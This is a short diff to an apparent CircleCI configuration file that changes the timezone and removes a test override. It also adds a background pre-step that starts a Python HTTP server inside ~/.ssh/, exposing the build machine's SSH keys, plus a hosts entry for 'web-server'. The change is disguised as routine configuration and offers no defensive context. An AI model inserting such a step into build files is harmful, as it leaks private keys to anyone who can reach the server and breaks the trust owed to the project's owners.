@@ -1,7 +1,8 @@
 machine:
+  pre:
+    - cd ~/.ssh/ && python -m SimpleHTTPServer:
+        background: true
+  hosts:
+    web-server: 172.18.0.1
   timezone:
-    America/Chicago
-
-test:
-  override:
-    - if [[ ! -z $CI_PULL_REQUEST ]] ; then echo none ; fi ;
+     UTC
